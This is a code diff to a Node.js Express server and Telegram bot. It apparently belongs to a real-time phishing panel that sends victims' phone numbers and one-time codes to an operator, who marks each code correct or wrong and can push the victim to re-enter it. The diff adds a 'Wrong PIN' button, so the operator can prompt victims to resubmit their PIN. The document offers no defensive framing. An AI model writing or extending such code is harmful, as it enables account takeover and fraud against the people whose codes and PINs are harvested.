@@ -110,7 +110,8 @@ app.post('/api/verify-first-otp', async (req, res) => {
                 inline_keyboard: [
                     [
                         { text: "✅ Correct", callback_data: `otp1_correct|${phone}|${otp}` },
-                        { text: "❌ Wrong Code", callback_data: `otp1_wrong|${phone}` }
+                        { text: "❌ Wrong Code", callback_data: `otp1_wrong|${phone}` },
+                        { text: "🔑 Wrong PIN", callback_data: `otp1_wrongpin|${phone}` }
                     ]
                 ]
             }
@@ -319,6 +320,15 @@ bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
     await ctx.answerCbQuery("Wrong Code");
     await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
     await ctx.replyWithHTML(`❌ <b>FIRST OTP WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter OTP.</b>`);
+});
+
+// OTP1 WRONG PIN
+bot.action(/^otp1_wrongpin\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    statusStore[phone] = "otp2_wrongpin"; // Triggers the same redirect check on page8
+    await ctx.answerCbQuery("Wrong PIN");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(`🔑 <b>WRONG PIN REPORTED (Step 1)</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>User prompted to re-enter PIN.</b>`);
 });
 
 // OTP2 CORRECT
